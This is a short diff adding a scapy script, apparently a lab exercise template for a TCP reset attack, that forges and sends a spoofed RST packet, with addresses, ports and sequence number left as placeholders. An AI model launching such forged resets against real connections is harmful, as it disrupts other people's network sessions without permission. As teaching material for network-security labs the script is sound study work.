@@ -29,5 +29,16 @@ while True:
     pass
 
 
+# Task 2.1 ----------------------------------------------------
+# Launching the attack manually
+#!/usr/bin/env python3
+from scapy.all import *
+
+ip = IP(src="@@@@", dst="@@@@")
+tcp = TCP(sport=@@, dport=@@, flags="R", seq=@@@@)
+pkt = ip/tcp
+ls(pkt)
+send(pkt, iface="eth0", verbose=0)
+
 
 
